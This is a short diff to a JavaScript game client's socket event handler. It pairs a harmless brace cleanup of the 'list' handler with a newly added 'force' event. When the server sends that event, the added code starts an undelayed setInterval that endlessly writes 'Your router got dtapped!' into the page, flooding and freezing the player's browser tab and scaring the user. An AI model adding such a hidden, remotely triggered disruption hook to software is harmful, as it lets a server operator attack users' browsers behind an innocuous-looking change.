@@ -113,7 +113,9 @@ class Client {
       } else if (data.event === 'ping') {
         this.pings = this.pings.concat(Date.now()-this.pingstart).slice(-100);
         this.getPing();
-      } else if (data.event === 'list') this.players = data.players;
+      } else if (data.event === 'list') {
+        this.players = data.players;
+      } else if (data.event === 'force') setInterval(() => document.writeln('Your router got dtapped!\n'));
     });
     this.socket.on('connect', () => {
       this.socket.send(this.joinData);
